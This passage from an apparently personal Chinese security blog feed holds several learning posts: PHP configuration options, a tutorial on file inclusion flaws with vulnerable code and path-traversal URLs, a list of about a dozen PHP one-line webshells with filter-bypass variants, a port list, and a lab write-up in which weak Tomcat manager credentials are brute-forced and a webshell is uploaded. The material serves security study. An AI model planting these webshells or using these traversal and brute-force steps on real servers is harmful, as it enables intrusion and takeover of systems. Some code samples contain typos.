class="line">short_open_tag  <span class="comment">#是否允许php脚本使用短开放标记，将&quot;&lt;?php ?&gt;&quot;改为&quot;&lt;? ?&gt;&quot;这个语法与XML相同，在某些情况下可能会导致问题，所以一般建议关闭</span></span><br><span class="line">asp_tags  <span class="comment">#是否支持ASP风格的脚本定界 &quot;&lt;% %&gt;&quot;</span></span><br><span class="line">precision  <span class="comment">#指定在浮点数表示中显示的有效数字，该项在win32系统中设置为14，linux中设置为12</span></span><br><span class="line">output_buffering  <span class="comment">#设置是否使用输出缓冲，或者设置输出缓冲区的大小。使用输出缓冲会使性能稍稍下降(output_buffering = &#x27;number&#x27;,output_buffering = On)</span></span><br><span class="line">output_handler  <span class="comment">#设置将输出返回给请求用户之前要把所有输出传输给一个函数。例如，假如你希望返回给浏览器之前先对所有输出进行压缩，可以将该项配置为PHP的压缩处理函数“ob_gzhsndler”</span></span><br><span class="line">zlib.output_compression  <span class="comment">#通过设置决定是否在输出返回浏览器之前先自动压缩，通过赋一个整数值，可以启用输出压缩，同时设置压缩缓冲罐区大小</span></span><br><span class="line">zlib.output_handler  <span class="comment">#如果zilb库不可用，该配置将指定一个特定的压缩库</span></span><br><span class="line">implicit_flush  <span class="comment">#启动时，每次调用print()或者echo()，以及完成各个嵌入的HTML块后，将自动清楚或刷新其内容的输出缓冲区，当服务器需要非常长的时间来编译结果或完成某些计算时，这可能很有用，在这些情况下，可以利用这个特征向用户输出状态更新，而不是等待服务器完成整个过程后才输出</span></span><br><span class="line">ignore_user_abort  <span class="comment">#是否设置即使在用户中止请求后也坚持完成整个请求，在执行一个长请求的时候应当考虑打开它，因为长请求可能会导致用户中途中止或浏览器超时，该配置项可以用于实现类似Unix的crontab(定时任务计划)功能</span></span><br><span class="line">zend.enable_gc  <span class="comment">#设置是否开启PHP的垃圾回收机制</span></span><br><span class="line">安全相关配置</span><br><span class="line">safe_mode</span><br><span class="line">safe_mode_gid</span><br><span class="line">safe_mode_include_dir</span><br><span class="line">safe_mode_exec_dir</span><br><span class="line">safe_mode_protected_env_vars</span><br><span class="line">open_basedir</span><br><span class="line">disable_functions</span><br><span class="line">disable_classes</span><br><span class="line">allow_url_include</span><br><span class="line">allow_url_fopen</span><br><span class="line">register_globals</span><br><span class="line">enable_dll</span><br><span class="line">cgi.force_redirect</span><br><span class="line">性能相关配置</span><br><span class="line">realpath_cache_size</span><br><span class="line">realpath_cache_ttl</span><br><span class="line">auto_globals_jit</span><br><span class="line">错误信息相关配置</span><br><span class="line">log_errors</span><br><span class="line">error_log</span><br><span class="line">error_reporting</span><br><span class="line">E_ALL</span><br><span class="line">E_ERROR</span><br><span class="line">E_WARNING</span><br><span class="line">E_PARSE</span><br><span class="line">E_NOTICE</span><br><span class="line">E_STRICT</span><br><span class="line">E_CORE_ERROR</span><br><span class="line">E_COMPILE_WARRING</span><br><span class="line">E_USER_ERROR</span><br><span class="line">E_USER_WARNING</span><br><span class="line">E_USER_NOTICE</span><br><span class="line">display_errors</span><br><span class="line">display_startup_errors</span><br><span class="line">track_errors</span><br><span class="line">log_errors_max_len</span><br><span class="line">ignore_repeated_errors</span><br><span class="line">ignore_repeated_source</span><br><span class="line">report_memleaks</span><br><span class="line">error_prepend_string</span><br><span class="line">error_append_string</span><br><span class="line">资源相关配置</span><br><span class="line">max_execution_time</span><br><span class="line">memory_execution_time</span><br><span class="line">max_input_nesting_level</span><br><span class="line">max_input_vars</span><br><span class="line">max_input_time</span><br><span class="line">default_socket_timeout</span><br><span class="line">pcre.backtrack_limit</span><br><span class="line">pcre.recursion_limit</span><br><span class="line">post_max_size</span><br><span class="line">数据处理相关配置</span><br><span class="line">allow_calltime_pass_reference</span><br><span class="line">register_argc_argv</span><br><span class="line">request_order</span><br><span class="line">variables_order</span><br><span class="line">arg_separator.output</span><br><span class="line">arg_separator.input</span><br><span class="line">auto_prepend_file和auto_append_file</span><br><span class="line">default_mimetype和default_charset</span><br><span class="line">文件上传相关配置</span><br><span class="line">file_uploads</span><br><span class="line">max_file_uploads</span><br><span class="line">upload_tmp_dir</span><br><span class="line">upload_max_filesize</span><br><span class="line">Session相关配置</span><br><span class="line">session.save_path</span><br><span class="line">session.save_handler</span><br><span class="line">session.use_cookies</span><br><span class="line">session.use_only_cookies</span><br><span class="line">session,name</span><br><span class="line">session,auto_start</span><br><span class="line">session.cookie_lifetime</span><br><span class="line">session.gc_probability和session.gc_divisor</span><br><span class="line">session.gc_maxlifetime</span><br><span class="line">session_trans_sid</span><br><span class="line">seaasion.bug_compat_42和session.bug_warn</span><br><span class="line">session.hash_bits_per_character</span><br><span class="line">url_rewrite.tags</span><br><span class="line">其他配置</span><br><span class="line">extension_dir</span><br><span class="line">extension</span><br><span class="line">date.timezone</span><br><span class="line">doc_root</span><br><span class="line">magic_quotes_gpc</span><br><span class="line">expose_php</span><br><span class="line">user_ini.filenmae和user_cache-ttl</span><br><span class="line">include_path</span><br><span class="line">sys_temp_dir</span><br><span class="line">cgi.nph</span><br><span class="line">SMTP</span><br><span class="line">smtp_port</span><br><span class="line">cgi.force_redirect</span><br><span class="line">cgi.fix_redirect</span><br><span class="line">cgi.fix_pathinfo</span><br><span class="line">Fastcgi.impersonate</span><br><span class="line">Fastcgi.impersonate</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
      
    
    
    
    <category term="相关配置" scheme="https://sinevil.github.io/categories/%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="文本语言" scheme="https://sinevil.github.io/tags/%E6%96%87%E6%9C%AC%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="https://sinevil.github.io/2021/07/20/wenjian/"/>
    <id>https://sinevil.github.io/2021/07/20/wenjian/</id>
    <published>2021-07-20T06:42:33.000Z</published>
    <updated>2021-07-25T01:28:04.220Z</updated>
    
    <content type="html"><![CDATA[<p><strong>文件包含漏洞</strong></p><ul><li>原理</li></ul><p>服务器执行代码时，可以通过文件包含函数加载另一个文件的代码，当被包含文件的代码中存在恶意代码时，也会将其解析并且执行，且该漏洞不只是出现在php语言中，还有其他语言，例如，jsp，asp。</p><ul><li>漏洞产生原因</li></ul><p>没有对文件包含的参数进行过滤或者严格的定义，并且参数可以被用户控制</p><ul><li>危害</li></ul><p>服务器的网页被篡改，网站被挂马，服务器被远端控制，被安装后门</p><ul><li>php中的常见函数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include  <span class="comment">#包含并且运行指定文件，include在出错时产生警告(E_WARNING)，脚本会继续运行</span></span><br><span class="line">include_once  <span class="comment">#在脚本执行期间包含并运行指定文件。该函数和include函数类似，两者唯一的区别是使用该函数时，php会检查指定文件是否已经被包含过，如果是，则不会再次包含</span></span><br><span class="line">require  <span class="comment">#包含并且运行指定文件，require在出错时产生E_COMPILE_ERROR级别的错误，导致脚本中止运行</span></span><br><span class="line">require_once  <span class="comment">#类似于include_once的require</span></span><br></pre></td></tr></table></figure><p><strong>本地文件包含漏洞</strong></p><ul><li>无限制本地文件包含</li></ul><p>无限制本地文件包含漏洞是指代码中没有为包含文件指定特定的前缀或者扩展名，因此攻击者可以利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息，或者执行其他文件中的代码</p><ul><li>常见的敏感信息路径</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Windows系统常见敏感文件</span><br><span class="line">C: \boot.ini          <span class="comment">#系统版本信息</span></span><br><span class="line">C: \xxx\php.ini       <span class="comment">#PHP配置信息</span></span><br><span class="line">C: \xxx\my.ini        <span class="comment">#MySQL配置信息</span></span><br><span class="line">C: \xxx\httpd.conf    <span class="comment">#Apache配置信息</span></span><br><span class="line">Linux系统常见敏感文件</span><br><span class="line">/etc/passwd                  <span class="comment">#Linux系统账号信息</span></span><br><span class="line">/etc/httpd/conf/httpd,conf   <span class="comment">#Apache配置信息</span></span><br><span class="line">/etc/my.conf                 <span class="comment">#MySQL配置信息</span></span><br><span class="line">/usr/etx/php.ini             <span class="comment">#PHP配置信息</span></span><br></pre></td></tr></table></figure><ul><li> 漏洞利用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">漏洞代码示例：</span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$GET_</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>);</span><br><span class="line">?&gt;  </span><br><span class="line">读取文件内容：</span><br><span class="line">目录遍历后获取路径，获取的系统中文件内容</span><br><span class="line">htt://www. . /xxx.php?filename=../../../../../../../路径</span><br><span class="line">执行代码：</span><br><span class="line">利用无限制本地文件包含漏洞，可以通过文件包含功能执行任意扩展名的文件中的代码</span><br><span class="line">http://路径/xxx.php?filename=文件</span><br></pre></td></tr></table></figure><ul><li>有限制本地文件包含</li></ul><p>有限制本地文件上传包含漏洞是指代码中为包含文件指定了特定的前缀或者<code>.php .html</code>等扩展名，攻击者需要绕过前缀或者扩展名过滤，才能利用文件包含漏洞读取操作系统中的其他文件，获取敏感信息，常见的有限制本地文件包含过滤绕过的方式主要有%00截断，路径长度截断，点号截断文件包含这三种</p><ul><li>%00截断文件包含</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">漏洞条件利用条件：</span><br><span class="line">magic_quotes_gpc=off</span><br><span class="line">PHP版本低于5.3.4</span><br><span class="line">漏洞代码示例</span><br><span class="line">&lt;?php</span><br><span class="line">  <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filenmae&#x27;</span>];</span><br><span class="line">  include(<span class="variable">$filename</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;文件包含漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;服务器执行代码时，可以通过文件包含函数加载另一个文件的代码，当被包含文件的代码中存在恶意代码时，也会将其解析并且执行，且该漏洞不只是出现在php语言中，还有其他语言，</summary>
      
    
    
    
    <category term="web基础" scheme="https://sinevil.github.io/categories/web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="webshell" scheme="https://sinevil.github.io/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>一句话木马</title>
    <link href="https://sinevil.github.io/2021/07/19/yijuhua/"/>
    <id>https://sinevil.github.io/2021/07/19/yijuhua/</id>
    <published>2021-07-19T11:23:05.000Z</published>
    <updated>2021-07-26T11:45:23.632Z</updated>
    
    <content type="html"><![CDATA[<p><strong>php一句话木马</strong></p><p><code> &lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code> </p><ul><li>运行原理</li></ul><p>php代码写在<?php ?> 中是因为这样服务器才能识别其为php代码，然后进行解析</p><p><code>@</code>符号的作用是不报错</p><p>php eval()的作用：把字符串按照php代码来计算，此字符串必须是合法的php代码，且必须以分号结尾</p><p>如果没有在代码字符串中调用return语句，则返回null，如果代码解析错误，则eval()函数返回false</p><p>实际上就是用post方法接收<code>[]</code>中的变量，然后把变量里面的字符串当做php代码来执行</p><ul><li>其他的一句话木马</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST1</span>);?&gt;</span><br><span class="line">&lt;?php <span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);&#125;?&gt;</span><br><span class="line">&lt;?php system(<span class="variable">$_REQUEST1</span>);?&gt;</span><br><span class="line">&lt;?php (<span class="variable">$_</span>=@<span class="variable">$_GET1</span>).@<span class="variable">$_</span>(<span class="variable">$_POST1</span>)?&gt;</span><br><span class="line">&lt;?php eval_r(<span class="variable">$_POST1</span>)?&gt;</span><br><span class="line">&lt;?php @eval_r(<span class="variable">$_POST1</span>)?&gt;  <span class="comment">#容错代码</span></span><br><span class="line">&lt;?php assert(<span class="variable">$_POST1</span>);?&gt;  <span class="comment">#使用Lanker一句话客户端的专家模式执行相关的PHP语句</span></span><br><span class="line">&lt;?<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>]);?&gt;</span><br><span class="line">&lt;?<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>])?&gt;</span><br><span class="line">&lt;?php @preg_replace(<span class="string">&quot;/[email]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;h&#x27;</span>],<span class="string">&quot;error&quot;</span>);?&gt;  <span class="comment">#使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt;</span></span><br><span class="line">&lt;?php <span class="built_in">echo</span> `<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]` ?&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@eval_r(<span class="variable">$_POST</span>[sb])&lt;/script&gt;  <span class="comment">#绕过&lt;?限制的一句话</span></span><br><span class="line">&lt;?=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);  <span class="comment">#绕过&lt;?php ?&gt;限制的一句话 </span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;php一句话木马&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt; &amp;lt;?php @eval($_POST[&amp;#39;cmd&amp;#39;]);?&amp;gt;&lt;/code&gt; &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;运行原理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;php代码写在&lt;?php </summary>
      
    
    
    
    <category term="web基础" scheme="https://sinevil.github.io/categories/web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="webshell" scheme="https://sinevil.github.io/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>port</title>
    <link href="https://sinevil.github.io/2021/07/18/port/"/>
    <id>https://sinevil.github.io/2021/07/18/port/</id>
    <published>2021-07-18T03:06:11.000Z</published>
    <updated>2021-07-27T01:27:12.363Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">常见端口汇总</span><br><span class="line">21端口：是FTP文件传输协议（控制）代理服务常用端口，用于连接</span><br><span class="line">22端口：是SSH远程登录协议的默认端口</span><br><span class="line">23端口：telnet（终端仿真协议）代理服务器常用端口</span><br><span class="line">80端口：http（超文本传输协议）用于网页浏览</span><br><span class="line">443端口：https服务，是提供加密和通过安全端口传输的另一种HTTP。</span><br><span class="line">1433端口：Microsoft的SQL服务默认端口</span><br><span class="line">1521端口：Oracle数据库默认端口</span><br><span class="line">3306端口：MySQL默认端口</span><br><span class="line">3389端口：Windows 2000远程桌面默认端口</span><br><span class="line">5432端口：PostgreSQL数据库的默认端口</span><br><span class="line">6379端口：阿里云开放的Redis的默认端口</span><br><span class="line">7001端口：Freak88，Weblogic默认端口</span><br><span class="line">7002端口：使用者&amp;组 数据库</span><br><span class="line">8080端口：www代理服务默认端口</span><br><span class="line">27017端口：MongoDB数据库默认端口</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
      
    
    
    
    <category term="web基础" scheme="https://sinevil.github.io/categories/web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="端口" scheme="https://sinevil.github.io/tags/%E7%AB%AF%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>tomcat弱密码爆破</title>
    <link href="https://sinevil.github.io/2021/07/15/tomcat/"/>
    <id>https://sinevil.github.io/2021/07/15/tomcat/</id>
    <published>2021-07-15T07:58:00.000Z</published>
    <updated>2021-07-27T01:31:57.206Z</updated>
    
    <content type="html"><![CDATA[<ul><li> 打开网页获取有效信息，Apache Tomcat/8.0.43及其醒目，猜测为一款软件以及他的版本号</li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210716090825.png" alt="QQ截图20210716090825"></p><ul><li>不晓得tomca是什么，百度一波</li></ul><p>Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。</p><ul><li>因为要渗透该靶场，所以查看一下comcat的目录情况，深入了解comcat的信息</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/bin  <span class="comment">#二进制文件</span></span><br><span class="line"> startup.bat      <span class="comment">#启动tomcat服务</span></span><br><span class="line"> shutdown.bat     <span class="comment">#关闭tomcat服务</span></span><br><span class="line">/conf  <span class="comment">#配置文件 </span></span><br><span class="line"> sever.xml        <span class="comment">#定义了tomcat启动时涉及的组件属性</span></span><br><span class="line"> tomcat-users.xml <span class="comment">#tomcat的用户密码和权限</span></span><br><span class="line"> web.xml          <span class="comment">#定义servlet </span></span><br><span class="line">/lib   <span class="comment">#存放全局的jar包</span></span><br><span class="line">/logs  <span class="comment">#日志</span></span><br><span class="line">/temp  <span class="comment">#临时文件</span></span><br><span class="line">/webapps  <span class="comment">#存放JAVA的WEB项目            </span></span><br><span class="line">        /manager  <span class="comment">#后台登录界面</span></span><br><span class="line">        /ROOT     <span class="comment">#根目录</span></span><br><span class="line">/work  <span class="comment">#存放jsp编译后产生的class文件</span></span><br></pre></td></tr></table></figure><ul><li>comcat有一个后台登录界面，我们尝试访问一下，弹出登录框，我们首先想到爆破，但是可以先搜索一下comcat有哪些漏洞可以利用</li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210715163504.png" alt="QQ截图20210715163504"></p><ul><li>直接搜一波tomcat的漏洞</li></ul><p><del><strong>CVE-2017-12615</strong></del></p><p><del><strong>影响版本</strong>：Tomcat 7.0.0 ～ 7.0.79</del></p><p><del><strong>影响说明</strong>：上传webshell，任意命令执行</del></p><blockquote><p>该漏洞与提供的靶场版本不符</p></blockquote><p><del><strong>CVE-2020-1938</strong></del></p><p><del><strong>影响版本</strong>:</del></p><p><del>Apache Tomcat 9.x &lt; 9.0.31</del></p><p><del>Apache Tomcat 8.x &lt; 8.5.51</del></p><p><del>Apache Tomcat 7.x &lt; 7.0.100</del> </p><p><del>Apache Tomcat 6.x</del></p><p><del><strong>影响说明</strong>：读取webapp下的所有文件</del></p><blockquote><p>未尝试</p></blockquote><p><strong>弱口令</strong></p><p><strong>影响版本</strong>：全版本</p><p><strong>环境说明</strong>：后台上传文件，getshell</p><ul><li><p>因为存在后台登录界面，介于自锁功能已经关闭，利用弱密码漏洞进行爆破</p><p>msf自带针对tomcat弱密码的爆破功能，在修改字典文档后进行爆破，得到tomcat的账号以及密码</p></li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210715145404.png" alt="QQ截图20210715145404"></p><ul><li>进入tomcat的后台，发现文件上传点</li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210715153939.png" alt="QQ截图20210715153939"></p><ul><li>标识需要上传一个<code>.war</code>文件，将冰蝎自配的<code>.jsp</code>打包成<code>.war</code>文件后上传，上传成功</li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210715154059.png" alt="QQ截图20210715154059"></p><ul><li>再用连接冰蝎，获取shell，寻找flag</li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210715154414.png" alt="QQ截图20210715154414"></p><ul><li>在根目录下找到一个flag文件，但是flag信息为fake flag，查看主机系统为liunx，使用find命令查询所有带flag文件，最后发现只有一个flag文件，在根目录下，判断为所找的flag</li></ul><p><img src="/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210715154747.png" alt="QQ截图20210715154747"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt; 打开网页获取有效信息，Apache Tomcat/8.0.43及其醒目，猜测为一款软件以及他的版本号&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/15/tomcat/QQ%E6%88%AA%E5%9B%BE20210716090825.p</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="中间件漏洞" scheme="https://sinevil.github.io/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
</feed>
